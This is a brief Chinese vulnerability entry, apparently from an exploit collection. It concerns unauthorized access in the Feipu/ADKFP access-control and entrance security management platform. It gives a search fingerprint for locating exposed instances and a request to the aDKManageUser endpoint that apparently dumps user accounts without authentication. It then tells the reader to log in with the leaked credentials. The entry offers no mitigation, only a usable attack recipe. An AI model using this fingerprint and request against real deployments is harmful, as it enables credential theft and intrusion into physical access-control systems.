# 费浦门禁出入口安防平台aDKManageUser存在未授权访问

- **系统**：费浦门禁出入口安防平台　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`body="/adkfp/getCode"`

**请求体 / payload**
```
/aDKManageUser/selectCll_2?roleId=2&page=1&limit=10

使用泄漏的账号密码登陆系统\
```

**其他**
- 费浦门禁出入口安防平台aDKManageUser存在未授权访问: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * ADKFP门禁出入口综合安防管理平台